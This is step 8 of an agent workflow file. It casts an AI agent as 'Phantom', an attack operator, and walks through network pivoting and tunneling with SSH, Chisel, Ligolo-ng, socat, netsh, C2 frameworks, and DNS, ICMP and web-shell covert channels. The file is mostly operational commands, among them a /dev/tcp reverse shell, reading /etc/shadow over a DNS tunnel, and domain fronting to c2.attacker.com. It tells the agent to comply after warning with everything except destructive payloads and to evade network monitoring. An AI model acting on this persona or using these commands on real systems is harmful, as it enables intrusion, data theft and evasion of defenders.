# Step 8: Network Pivoting & Tunneling

**Progress: Step 8 of 10** — Next: Access Verification & Persistence

## STEP GOAL:

Establish network pivots and tunnels to bridge segmented networks, reach isolated systems, and create reliable communication channels for sustained operations. Design and deploy multi-hop pivot chains, covert channels, and proxy infrastructure that enables access to targets not directly reachable from the operator's position. This step transforms compromised hosts from steps 04-07 into operational infrastructure — relay points, tunnel endpoints, and proxy nodes that extend the operator's reach across network boundaries.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER deploy tunnel infrastructure without first confirming the pivot host is stable and under operator control
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE AN ATTACK OPERATOR building covert network infrastructure to bridge segmented environments
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🌐 Network pivoting ONLY — this is infrastructure, not lateral movement execution
- 🔬 Every pivot must be tested for reliability and throughput before relying on it
- 🕳️ Covert channels add complexity — only use when standard tunnels would be detected
- 📋 Document the complete pivot topology — a lost pivot chain during exfiltration is catastrophic
- 🔁 Redundancy is mandatory for critical pivot chains — single points of failure are unacceptable

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - SSH tunnels and SOCKS proxies on non-standard ports generate network anomaly alerts in NTA/NBAD systems — use common ports (443, 80, 53) when possible and match expected protocol behavior
  - Long-running tunnel connections create persistent network state that NDR/NTA solutions profile and flag — implement keepalives and session rotation to avoid connection duration anomalies
  - DNS tunneling generates high volumes of DNS queries with anomalous subdomain patterns that DNS monitoring (passive DNS, DNS analytics) will flag — use only as last resort when all other channels are detected
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present pivot requirements analysis and topology design before building infrastructure
- ⚠️ Present [A]/[W]/[C] menu after pivot chains are established and tested
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: ALL prior step results (02-07) — network topology, compromised systems, credentials, movement paths
- Focus: Building pivot infrastructure to bridge network segments and reach isolated targets
- Limits: Do NOT execute new lateral movement — only build the transport layer. Exploitation happens in steps 04-07.
- Dependencies: Steps 02 (network recon), 04-07 (compromised hosts that serve as pivot points)

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Pivot Requirements Analysis

**Based on steps 02-07 results, identify all pivoting requirements:**

Analyze the network topology discovered in step 02 and the compromised hosts from steps 04-07 to determine what pivot infrastructure is needed.

**Identify for each requirement:**
- Network segments requiring bridging (source segment → target segment)
- Targets not directly reachable from current position
- Available pivot hosts (compromised systems with multi-homed interfaces or gateway positions)
- Protocol restrictions per segment (firewall rules, proxy requirements, DPI, IPS/IDS)
- Bandwidth requirements (will operational tools need high throughput?)
- Latency tolerance (interactive shells vs batch operations)

**Present Pivot Requirements Matrix:**

| ID | Source Segment | Target Segment | Pivot Host | Protocol Available | Restrictions | Priority |
|----|---------------|----------------|------------|-------------------|-------------|----------|
| PIV-001 | {{source_cidr}} | {{target_cidr}} | {{hostname/ip}} | {{SSH/HTTP/DNS/SMB}} | {{firewall, DPI, proxy}} | Critical/High/Medium |

**Pivot Host Assessment:**

For each potential pivot host, evaluate suitability:

| Pivot Host | IP(s) | OS | Privilege Level | Stability | Interfaces | Gateway? | Monitoring Level |
|-----------|-------|-----|----------------|-----------|-----------|---------|-----------------|
| {{host}} | {{ips}} | {{os}} | {{priv}} | Stable/Fragile | {{iface_count}} | Yes/No | {{estimated_monitoring}} |

**Key questions before proceeding:**
1. Which segments contain targets we haven't reached yet?
2. Which compromised hosts sit at network boundaries?
3. What protocols are allowed through segment firewalls?
4. Is there a proxy or next-gen firewall performing deep packet inspection?
5. What is the estimated monitoring level per segment? (SOC visibility, NIDS/NIPS, NTA/NBAD)

**Present the complete requirements analysis before proceeding to infrastructure design.**

### 2. SSH Tunneling (T1572)

**SSH-based pivoting — the most reliable and versatile tunneling method when SSH is available:**

#### Local Port Forwarding (Access Remote Service Through Pivot)

```bash
# Access a service on target_host:target_port through pivot
ssh -L [bind_addr:]local_port:target_host:target_port pivot_user@pivot_host

# Example: Access internal web app (10.10.20.50:8080) through pivot at 10.10.10.5
ssh -L 127.0.0.1:8080:10.10.20.50:8080 compromised@10.10.10.5

# Access RDP on isolated host through pivot
ssh -L 127.0.0.1:3389:10.10.30.100:3389 compromised@10.10.10.5

# Access SMB on internal file server through pivot
ssh -L 127.0.0.1:445:10.10.20.10:445 compromised@10.10.10.5

# Multiple local forwards in single session
ssh -L 8080:10.10.20.50:8080 -L 3389:10.10.30.100:3389 -L 445:10.10.20.10:445 compromised@10.10.10.5
```

**Use case:** Access specific services on internal hosts through a compromised pivot.
**OPSEC:** Single outbound SSH session — moderate risk. Minimize if SSH is not normal traffic.
**Throughput:** Near-native — suitable for most operations including file transfer.

#### Remote Port Forwarding (Expose Operator Services Through Pivot)

```bash
# Expose a local service through the pivot host
ssh -R [bind_addr:]remote_port:local_host:local_port pivot_user@pivot_host

# Example: Expose operator's Metasploit handler through pivot
ssh -R 0.0.0.0:4444:127.0.0.1:4444 compromised@10.10.10.5

# Expose operator's web server for file staging
ssh -R 0.0.0.0:8443:127.0.0.1:8443 compromised@10.10.10.5

# Note: GatewayPorts must be enabled on pivot for 0.0.0.0 binding
# If not: ssh -R 127.0.0.1:4444:127.0.0.1:4444 + socat on pivot for redirect
```

**Use case:** Allow internal hosts to reach operator services through the pivot.
**OPSEC:** Creates a listening port on the pivot — increased detection surface.
**Throughput:** Near-native.

#### Dynamic Port Forwarding (SOCKS Proxy Through Pivot)

```bash
# Create SOCKS4/5 proxy through pivot
ssh -D [bind_addr:]port pivot_user@pivot_host

# Example: SOCKS proxy on local port 1080
ssh -D 127.0.0.1:1080 compromised@10.10.10.5

# With compression for bandwidth-limited links
ssh -D 127.0.0.1:1080 -C compromised@10.10.10.5

# Background the SSH session (no interactive shell)
ssh -D 127.0.0.1:1080 -N -f compromised@10.10.10.5

# Combined with ProxyChains for tool proxying
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.20.0/24
proxychains crackmapexec smb 10.10.20.0/24
```

**Use case:** Universal proxy — route any TCP traffic through the pivot.
**OPSEC:** Single SSH session, but all traffic funnels through it — traffic volume anomaly risk.
**Throughput:** Good for interactive tools. Large file transfers may be slower due to SOCKS overhead.

#### ProxyJump / Multi-Hop Chaining

```bash
# Multi-hop transparent pivoting (OpenSSH 7.3+)
ssh -J pivot1_user@pivot1,pivot2_user@pivot2 target_user@target

# Example: Operator → Pivot1 (10.10.10.5) → Pivot2 (10.10.20.15) → Target (10.10.30.100)
ssh -J compromised@10.10.10.5,admin@10.10.20.15 root@10.10.30.100

# SSH config for persistent multi-hop (cleaner for repeated use)
# ~/.ssh/config:
# Host pivot1
#   HostName 10.10.10.5
#   User compromised
# Host pivot2
#   HostName 10.10.20.15
#   User admin
#   ProxyJump pivot1
# Host target
#   HostName 10.10.30.100
#   User root
#   ProxyJump pivot2

# Dynamic SOCKS through multi-hop
ssh -J compromised@10.10.10.5,admin@10.10.20.15 -D 1080 -N root@10.10.30.100

# Legacy ProxyCommand (for older OpenSSH without -J)
ssh -o ProxyCommand="ssh -W %h:%p compromised@10.10.10.5" admin@10.10.20.15
```

**Use case:** Reach deeply segmented networks through multiple pivot hosts.
**OPSEC:** Each hop generates an SSH session — more hops = more detection surface.
**Throughput:** Degrades with each hop. Test before relying on deep chains.

#### SSH Over HTTP (Proxy-Restricted Environments)

```bash
# Using corkscrew to tunnel SSH through an HTTP proxy
# ~/.ssh/config:
# Host pivot-via-proxy
#   HostName pivot_host
#   User compromised
#   ProxyCommand corkscrew proxy_host proxy_port %h %p

# Using httptunnel
# On pivot (server side):
hts -F 127.0.0.1:22 80
# On operator (client side):
htc -F 2222 pivot_host:80
ssh -p 2222 compromised@127.0.0.1

# Using proxytunnel
proxytunnel -p proxy_host:8080 -d pivot_host:443 -a 2222
ssh -p 2222 compromised@127.0.0.1
```

**Use case:** When the only allowed egress is through an HTTP proxy.
**OPSEC:** HTTP CONNECT method may be logged by the proxy — use HTTPS to encrypt the tunnel content.
**Throughput:** Limited by proxy — typically adequate for interactive operations.

**SSH Tunneling OPSEC Summary:**

| Technique | Detection Risk | Network Signature | Recommended Port |
|-----------|---------------|-------------------|-----------------|
| Local forward | Low-Medium | Single SSH session | 22 or remap to 443 |
| Remote forward | Medium | Listening port on pivot | Blend with existing services |
| Dynamic SOCKS | Medium | SSH + proxied traffic volume | 22 or remap to 443 |
| ProxyJump | Medium-High | Multiple SSH sessions in chain | Standard SSH ports |
| SSH over HTTP | Low-Medium | HTTP CONNECT or tunneled traffic | 80/443 (expected) |

### 3. SOCKS Proxy & Proxy Chains

**Dedicated tunneling tools — faster, more stable, and more flexible than SSH SOCKS:**

#### Chisel (T1572)

```bash
# Server mode on operator machine (reverse tunnel)
./chisel server --reverse --port 8443 --socks5

# Client on pivot host (connects back to operator)
./chisel client operator_ip:8443 R:1080:socks

# Result: SOCKS5 proxy on operator's port 1080, traffic exits through pivot
# Use with proxychains: proxychains nmap -sT -Pn target_subnet

# Chisel with TLS (blend with HTTPS traffic)
./chisel server --reverse --port 443 --socks5 --key /path/to/key --cert /path/to/cert
./chisel client --fingerprint FINGERPRINT operator_ip:443 R:1080:socks

# Chisel TCP port forward (specific services)
./chisel client operator_ip:8443 R:3389:10.10.20.100:3389

# Multiple forwards in single connection
./chisel client operator_ip:8443 R:1080:socks R:3389:10.10.20.100:3389 R:445:10.10.20.10:445
```

**Advantages:** Single binary (Go), cross-platform, fast, supports reverse connections, TLS.
**OPSEC:** HTTP/WebSocket upgrade — looks like legitimate HTTPS if TLS is configured on port 443.
**Throughput:** Excellent — significantly faster than SSH SOCKS for bulk operations.

#### Ligolo-ng (T1572)

```bash
# Operator machine: start proxy server
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot host: start agent (reverse connection)
./agent -connect operator_ip:11601 -ignore-cert

# In ligolo-ng interface:
# session — select the agent session
# ifconfig — view pivot host interfaces
# start — start the tunnel

# Add route on operator machine for target subnet
sudo ip route add 10.10.20.0/24 dev ligolo

# Result: transparent routing — no SOCKS overhead, tools work natively
# nmap -sT -Pn 10.10.20.0/24 (direct, no proxychains needed)
# crackmapexec smb 10.10.20.0/24 (direct)
# impacket-psexec admin@10.10.20.100 (direct)

# Double pivot (agent on second pivot behind first)
# Agent on pivot2 connects to pivot1's ligolo listener
# Add route for third segment through the double pivot
```

**Advantages:** TUN interface — transparent routing, no SOCKS overhead, tools work natively without proxychains.
**OPSEC:** Custom protocol on non-standard port by default — remap to 443 with TLS for blending.
**Throughput:** Best-in-class for tunneling tools — near-native network performance.

#### SSF (Secure Socket Funneling)

```bash
# Server on pivot host
./ssfd -p 8011

# Client on operator (local SOCKS through pivot)
./ssf -D 1080 -p 8011 pivot_host

# Remote port forward
./ssf -F 4444:operator_ip:4444 -p 8011 pivot_host

# Multiplex multiple tunnels through single connection
./ssf -D 1080 -L 8080:10.10.20.50:8080 -F 4444:operator_ip:4444 -p 8011 pivot_host
```

**Advantages:** Multiplexed tunnels in single connection, encrypted, supports all forward types.
**OPSEC:** Custom protocol — less likely to be fingerprinted but also less likely to blend.
**Throughput:** Good — lower overhead than SSH for multiplexed tunnels.

#### Rpivot (Reverse SOCKS Proxy)

```bash
# Server on operator (listens for reverse connection)
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080

# Client on pivot host (reverse connects to operator)
python client.py --server-ip operator_ip --server-port 9999

# Result: SOCKS4 proxy on operator's port 1080
# Useful when: inbound connections to pivot are blocked, but outbound is allowed

# NTLM proxy traversal (corporate environments)
python client.py --server-ip operator_ip --server-port 9999 --ntlm-proxy-ip proxy_ip --ntlm-proxy-port 8080 --domain CORP --username user --password pass
```

**Advantages:** Reverse SOCKS — works when inbound connections are blocked. NTLM proxy support.
**OPSEC:** Python dependency on pivot. Use compiled version or ensure Python is available.
**Throughput:** Moderate — Python-based, slower than Go-based alternatives.

#### Proxychains / Proxychains-ng Configuration

```bash
# /etc/proxychains4.conf (or /etc/proxychains.conf)
# strict_chain — each proxy must succeed, in order
# dynamic_chain — skip dead proxies, continue with remaining
# random_chain — randomize proxy order

strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Single SOCKS proxy
socks5 127.0.0.1 1080

# Chained proxies (multi-hop)
socks5 127.0.0.1 1080   # First hop (Chisel to pivot1)
socks5 127.0.0.1 1081   # Second hop (SSH SOCKS through pivot1 to pivot2)

# Usage with offensive tools
proxychains4 nmap -sT -Pn -n 10.10.20.0/24
proxychains4 crackmapexec smb 10.10.20.0/24 -u admin -p Password1
proxychains4 impacket-secretsdump admin:Password1@10.10.20.100
proxychains4 evil-winrm -i 10.10.20.100 -u admin -p Password1
proxychains4 bloodhound-python -u admin -p Password1 -d corp.local -dc dc01.corp.local
```

**Tool compatibility notes:**
- nmap: use `-sT` (TCP connect) — SYN scan does not work through SOCKS
- CrackMapExec: fully compatible with proxychains
- Impacket: fully compatible
- BloodHound: use `bloodhound-python` with proxychains
- Responder/mitm6: do NOT work through SOCKS — must run directly on pivot

#### Metasploit SOCKS Module

```bash
# In Metasploit with an active session on the pivot
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Add route through session
route add 10.10.20.0/24 <session_id>

# Now Metasploit modules automatically route through the pivot
use exploit/windows/smb/psexec
set RHOSTS 10.10.20.100
set SMBUser admin
set SMBPass Password1
run

# Use with proxychains for external tools
# proxychains nmap -sT -Pn 10.10.20.0/24
```

**Proxy Tool Comparison:**

| Tool | Speed | Stability | OPSEC | Ease of Use | Platform | Transparent? |
|------|-------|----------|-------|-------------|----------|-------------|
| Chisel | Fast | High | Good (TLS) | Easy | Cross-platform | No (SOCKS) |
| Ligolo-ng | Fastest | High | Medium | Moderate | Cross-platform | Yes (TUN) |
| SSF | Good | High | Medium | Moderate | Cross-platform | No (SOCKS) |
| Rpivot | Moderate | Medium | Medium | Easy | Python | No (SOCKS) |
| SSH SOCKS | Good | High | Good | Easy | SSH required | No (SOCKS) |
| Metasploit | Moderate | Medium | Low | Easy | Meterpreter | Partial |

**Present comparison and recommend tools based on the environment before proceeding.**

### 4. Port Forwarding & Redirection

**Lightweight relay infrastructure for specific service access:**

#### socat (T1090)

```bash
# Simple TCP port relay (on pivot host)
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.50:8080

# UDP relay
socat UDP-LISTEN:53,fork,reuseaddr UDP:10.10.20.1:53

# TLS-wrapped relay (encrypt the relay hop)
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:10.10.20.50:8080

# Bidirectional relay between two hosts
socat TCP-LISTEN:4444,fork TCP:operator_ip:4444

# File transfer relay
socat TCP-LISTEN:9999,fork OPEN:/tmp/exfil.dat,creat,wronly

# socat as reverse shell relay
# On pivot: socat TCP-LISTEN:4444,fork TCP:operator_ip:4444
# On target: bash -i >& /dev/tcp/pivot_ip/4444 0>&1
# Result: target → pivot → operator
```

**Advantages:** Extremely versatile, supports TCP/UDP/SSL/UNIX sockets, bidirectional.
**OPSEC:** No encryption by default — use OPENSSL listener for encrypted relays.
**Platform:** Linux/Unix. Install or compile statically for the target.

#### netsh (Windows Native — T1090.001)

```bash
# Add port proxy rule (Windows)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.20.50 connectport=8080

# IPv6 to IPv4 (bypass IPv4-only firewall rules)
netsh interface portproxy add v6tov4 listenaddress=:: listenport=8080 connectaddress=10.10.20.50 connectport=8080

# View all port proxy rules
netsh interface portproxy show all

# Remove rule
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080

# Add firewall exception for the listening port
netsh advfirewall firewall add rule name="Pivot-8080" dir=in action=allow protocol=tcp localport=8080

# Remove firewall exception (cleanup)
netsh advfirewall firewall delete rule name="Pivot-8080"
```

**Advantages:** Native Windows — no tools to upload. Persists until explicitly removed.
**OPSEC:** `netsh interface portproxy` changes are logged. Firewall rule creation generates event 2004 in Microsoft-Windows-Windows Firewall With Advanced Security/Firewall.
**Detection:** Monitor for `netsh interface portproxy` in command line logging (Sysmon Event ID 1, PowerShell ScriptBlock logging).

#### iptables / nftables (Linux Native — T1090)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables DNAT (redirect incoming traffic to internal target)
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 10.10.20.50:8080
iptables -t nat -A POSTROUTING -j MASQUERADE

# nftables equivalent
nft add table nat
nft add chain nat prerouting { type nat hook prerouting priority 0 \; }
nft add chain nat postrouting { type nat hook postrouting priority 100 \; }
nft add rule nat prerouting tcp dport 8080 dnat to 10.10.20.50:8080
nft add rule nat postrouting masquerade

# Port redirect (local port to remote)
iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.10.20.50:80

# View current rules
iptables -t nat -L -n -v
nft list ruleset

# Cleanup
iptables -t nat -F
echo 0 > /proc/sys/net/ipv4/ip_forward
```

**Advantages:** Native Linux — kernel-level forwarding, zero overhead, transparent to applications.
**OPSEC:** Requires root. iptables changes are not logged by default but auditd may capture the commands.
**Detection:** Monitor for `iptables` / `nft` command execution and changes to `/proc/sys/net/ipv4/ip_forward`.

#### Windows SSH (OpenSSH — Native on Modern Windows)

```bash
# Windows 10 1809+ / Server 2019+ have OpenSSH client built-in
# Local forward through Windows pivot
ssh -L 127.0.0.1:445:10.10.20.10:445 admin@windows_pivot

# Dynamic SOCKS through Windows pivot
ssh -D 1080 -N admin@windows_pivot

# If OpenSSH server is installed on pivot, use it as full SSH pivot
# Start the service: Start-Service sshd
# Then use all SSH tunneling techniques from section 2
```

#### Plink (PuTTY SSH — T1572)

```bash
# Local port forward via Plink
plink.exe -L 8080:10.10.20.50:8080 compromised@pivot_host -pw password -batch

# Dynamic SOCKS via Plink
plink.exe -D 1080 compromised@pivot_host -pw password -batch

# Remote forward via Plink
plink.exe -R 4444:127.0.0.1:4444 compromised@pivot_host -pw password -batch

# Non-interactive (for use in scripts)
echo y | plink.exe -D 1080 compromised@pivot_host -pw password -batch
```

**Advantages:** Single exe, no installation, works on older Windows.
**OPSEC:** `plink.exe` is a known offensive tool — rename and use from a non-standard path.
**Detection:** EDR may flag plink.exe by name or hash. Consider compiling from source with modifications.

**Port Forwarding Summary:**

| Tool | Platform | Requires | Persistent? | OPSEC | Best For |
|------|----------|----------|------------|-------|---------|
| socat | Linux | Upload binary | No (session) | Medium | Versatile relays |
| netsh | Windows | Native (admin) | Yes (survives reboot) | Medium-High | Windows pivoting |
| iptables/nft | Linux | Root | No (flush on reboot) | Low | Transparent redirect |
| Windows SSH | Windows 10+ | Native | No (session) | Low | Modern Windows |
| Plink | Windows | Upload exe | No (session) | Medium-High | Legacy Windows |

### 5. C2 Pivot Integration

**Leverage existing C2 infrastructure for pivoting — the C2 framework becomes the tunnel:**

#### Cobalt Strike Pivoting

```
# SMB Beacon Chaining (T1071.002)
# Create SMB listener
listeners > Add > Beacon SMB > pipename: msagent_##

# Link to SMB beacon on internal host (named pipe pivot)
link target_host pipe_name

# TCP Beacon (reverse connect)
listeners > Add > Beacon TCP > port: 4444
# On pivot: connect target_host 4444

# Pivot listener (route external beacons through internal pivot)
# On pivot beacon: [beacon] > Pivoting > Listener
# Create a reverse HTTPS listener that routes through the pivot beacon

# SOCKS proxy through beacon
[beacon] > Pivoting > SOCKS Server > Port: 1080
# All tools proxied through proxychains will exit via the beacon's host

# Port forward through beacon
[beacon] > Pivoting > Port Forward > rportfwd 8080 10.10.20.50 8080

# Reverse port forward (external → pivot → operator)
[beacon] > rportfwd_local 4444 127.0.0.1 4444
```

**SMB Beacon OPSEC:** Named pipe traffic is normal in Windows environments. Low detection risk if pipe names match organizational patterns. High-value for internal pivoting — no network connections between hosts visible to NIDS.

**TCP Beacon OPSEC:** Direct TCP connection between hosts — visible to network monitoring. Use only when SMB named pipes are not available.

#### Sliver Pivoting

```bash
# TCP pivot
# Generate pivot implant: generate --tcp-pivot pivot_host:4444 -o linux
# Start TCP pivot listener on compromised host
pivots tcp --bind 0.0.0.0:4444

# Named pipe pivot (Windows)
pivots namedpipe --bind \\.\pipe\sliverpivot

# WireGuard pivot (encrypted tunnel)
# Generate WireGuard implant: generate --wg pivot
wg-portfwd add --bind 0.0.0.0:1080 --remote 10.10.20.50:8080

# Session routing — route through sessions
# Sliver automatically routes traffic through the session's host

# SOCKS proxy through session
socks5 start --port 1080

# Port forward
portfwd add --bind 127.0.0.1:8080 --remote 10.10.20.50:8080
```

**WireGuard pivot OPSEC:** Encrypted tunnel that looks like standard WireGuard VPN traffic. Excellent OPSEC if WireGuard is used in the environment.

#### Mythic Pivoting

```bash
# SOCKS proxy through agent
# Use the SOCKS module for the agent type (e.g., Apollo, Poseidon, Medusa)
# Apollo (C#): socks start -port 1080
# Poseidon (Go): socks -port 1080

# Port forward through agent
# Apollo: rportfwd -lport 8080 -rhost 10.10.20.50 -rport 8080

# P2P agent chaining
# Deploy P2P agent on internal host, link through existing agent
# Supports SMB, TCP, and HTTP P2P channels

# Agent-to-agent communication
# Configure C2 profile for internal P2P communication
# Mythic server → Internet agent → P2P agent chain → deep internal targets
```

#### Metasploit Pivoting

```bash
# Route add through session
route add 10.10.20.0/24 <session_id>

# Autoroute module
use post/multi/manage/autoroute
set SESSION <session_id>
set SUBNET 10.10.20.0
set NETMASK /24
run

# Port forward
portfwd add -l 8080 -p 8080 -r 10.10.20.50

# Reverse port forward
portfwd add -R -l 4444 -p 4444 -L 0.0.0.0

# SOCKS proxy (see section 3)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Relay module for multi-hop
# Session 1 (pivot1) → route → Session 2 (pivot2) → route → target
route add 10.10.30.0/24 <session_2_id>
```

#### C2 Traffic Profiles & Encapsulation

```
# Cobalt Strike Malleable C2 profiles
# HTTPS traffic that mimics legitimate web browsing
set sleeptime "30000";
set jitter "37";
http-get {
    set uri "/api/v1/status";
    client {
        header "Accept" "application/json";
        header "Host" "cdn.legitimate-domain.com";
    }
}

# Domain fronting (use CDN to mask C2 destination)
# Actual C2: c2.attacker.com
# Fronted domain: d123456.cloudfront.net
# Host header: c2.attacker.com
# CDN routes based on Host header — network sees traffic to cloudfront.net
set host_stage "false";
http-stager {
    client {
        header "Host" "c2.attacker.com";
    }
}

# DNS C2 profile (T1071.004)
# Beacon over DNS — extremely slow but very covert
dns-beacon {
    set dns_idle "8.8.8.8";
    set dns_max_txt "220";
    set dns_sleep "0";
    set dns_ttl "5";
    set maxdns "235";
    set beacon "a]record";
}
```

**Present C2 Pivot Architecture:**

```
C2 Pivot Topology:

Operator C2 Server
    │
    ├── [HTTPS/443] ──── Pivot1 (Beacon) ──── [SMB Pipe] ──── Target_A (SMB Beacon)
    │                         │
    │                         ├── [TCP/4444] ──── Target_B (TCP Beacon)
    │                         │
    │                         └── [SOCKS/1080] ──── Proxychains ──── Target_Subnet
    │
    └── [DNS] ──── Pivot2 (DNS Beacon) ──── [Named Pipe] ──── Target_C (isolated segment)
```

**Present the C2 pivot architecture adapted to the engagement before proceeding.**

### 6. Covert Channels (When Standard Tunnels Are Detected)

**Use covert channels ONLY when standard tunneling methods have been or would likely be detected. These add complexity and reduce throughput.**

#### DNS Tunneling (T1071.004)

```bash
# dnscat2 — full tunnel over DNS
# Server (operator):
ruby dnscat2.rb tunnel.attacker.com --secret=shared_secret
# Client (pivot):
./dnscat2 tunnel.attacker.com --secret=shared_secret

# dnscat2 commands (in server console):
# session -i 1
# shell              — interactive shell
# listen 1080 10.10.20.50:445   — port forward
# download /etc/shadow          — file transfer

# iodine — IP-over-DNS tunnel
# Server (operator):
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# Client (pivot):
iodine -f -P password tunnel.attacker.com
# Result: TUN interface (dns0) with IP 10.0.0.2 — transparent routing
# ssh through the tunnel: ssh root@10.0.0.1

# dns2tcp — TCP-over-DNS
# Server config (/etc/dns2tcpd.conf):
# listen = 0.0.0.0
# port = 53
# domain = tunnel.attacker.com
# resources = ssh:127.0.0.1:22,http:127.0.0.1:8080
# Client:
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222 dns_server_ip
ssh -p 2222 user@127.0.0.1
```

**Throughput:** 5-50 KB/s typical. Extremely slow — suitable for C2 beacons and small file transfers only.
**Detection risk:** HIGH — DNS analytics, passive DNS monitoring, and DNS query volume anomaly detection will flag high-frequency DNS queries with encoded subdomain patterns. Modern EDR/NDR solutions specifically look for DNS tunneling.
**Use when:** All other channels are detected or blocked. DNS egress is the last resort.

#### ICMP Tunneling (T1095)

```bash
# icmpsh — ICMP reverse shell
# Operator (listener):
python icmpsh_m.py operator_ip pivot_ip
# Pivot (client):
icmpsh.exe -t operator_ip

# icmptunnel — IP-over-ICMP
# Server (operator):
./icmptunnel -s
# Set up TUN interface
ifconfig tun0 10.0.0.1 netmask 255.255.255.0
# Client (pivot):
./icmptunnel pivot_ip
ifconfig tun0 10.0.0.2 netmask 255.255.255.0

# ptunnel-ng — TCP-over-ICMP
# Server (operator):
ptunnel-ng -s
# Client (pivot):
ptunnel-ng -p operator_ip -l 2222 -r 127.0.0.1 -R 22
# SSH through ICMP: ssh -p 2222 user@127.0.0.1
```

**Throughput:** 10-100 KB/s. Moderate — better than DNS but still limited.
**Detection risk:** MEDIUM-HIGH — ICMP payload inspection and volume anomaly detection. Many environments block ICMP entirely.
**Use when:** TCP egress is blocked but ICMP echo is allowed. Test ICMP reachability first.

#### HTTP/HTTPS Web Shell Tunneling (T1071.001)

```bash
# reGeorg / Neo-reGeorg — SOCKS through web shell
# Upload tunnel.aspx / tunnel.php / tunnel.jsp to web server
# Neo-reGeorg (improved, encrypted):
python neoreg.py generate -k password123
# Upload tunnel.aspx to target web server

# Connect:
python neoreg.py -k password123 -u http://target/tunnel.aspx -p 1080
# Result: SOCKS proxy on port 1080 through the web shell

# ABPTTS (A Black Path Toward The Sun)
# Generate server component:
python abpttsfactory.py -o webshell.aspx
# Upload to target web server
# Connect:
python abpttsclient.py -c config.txt -u http://target/webshell.aspx -f 127.0.0.1:4444/10.10.20.50:3389

# Pivotnacci — web shell tunnel with encryption and chunking
# Generate and upload web shell
python pivotnacci.py generate -t aspx -o pivot.aspx
# Connect:
python pivotnacci.py connect -u http://target/pivot.aspx --password secret --socks-port 1080
```

**Throughput:** 50-500 KB/s. Dependent on web server performance and request size limits.
**Detection risk:** MEDIUM — web shell detection (file integrity monitoring, WAF), but tunnel traffic blends with HTTP. Encrypted variants (Neo-reGeorg, ABPTTS) resist content inspection.
**Use when:** A web application is compromised and HTTP/HTTPS is the only allowed protocol.

#### Domain Fronting (T1090.004)

```bash
# Concept: use a legitimate CDN domain as the SNI/DNS target
# The CDN routes to the real C2 server based on the Host header
# Network monitoring sees traffic to cloudfront.net, not attacker.com

# CloudFront domain fronting:
# 1. Set up C2 server behind CloudFront distribution
# 2. Configure Cobalt Strike/Sliver to use the fronted domain
# 3. Network traffic shows: TLS SNI = d123456.cloudfront.net
#    Host header (encrypted) = c2.attacker.com

# Azure CDN domain fronting:
# 1. Create Azure CDN endpoint pointing to C2
# 2. Use the azureedge.net domain as the front
# 3. Traffic appears as Azure CDN usage

# Note: many CDN providers have restricted domain fronting
# Test availability before relying on this technique
# AWS blocked in 2018, Google blocked in 2018
# Some CDN providers still allow it — test per engagement

# Alternative: redirector infrastructure
# Use legitimate cloud services (Azure App Service, AWS Lambda) as redirectors
# Traffic → Cloud service → redirect to C2
# Network sees traffic to azure.com / amazonaws.com
```

**Detection risk:** LOW (when functional) — traffic appears to go to a legitimate CDN.
**Limitations:** Increasingly restricted by CDN providers. Requires prior infrastructure setup.
**Use when:** Nation-state level OPSEC is required and CDN restrictions have been validated.

#### WebSocket Tunneling

```bash
# wstunnel — TCP over WebSocket
# Server (operator):
wstunnel server ws://0.0.0.0:8080

# Client (pivot):
wstunnel client -L 1080:10.10.20.50:445 ws://operator_ip:8080

# WebSocket over HTTPS (blend with legitimate traffic)
wstunnel server wss://0.0.0.0:443 --tls-cert cert.pem --tls-key key.pem
wstunnel client -L socks5://1080 wss://operator_ip:443

# Advantage: WebSockets maintain persistent bidirectional connections
# through HTTP proxies that allow WebSocket upgrade
# Many web proxies and firewalls allow WebSocket (used by legitimate apps)
```

**Throughput:** Good — similar to HTTP tunneling but persistent connection reduces overhead.
**Detection risk:** LOW-MEDIUM — WebSocket is increasingly common in legitimate applications.
**Use when:** HTTP/HTTPS is allowed and you need a persistent bidirectional channel.

**Covert Channel Comparison:**

| Channel | Throughput | Detection Risk | Setup Complexity | Reliability | Last Resort? |
|---------|-----------|---------------|-----------------|------------|-------------|
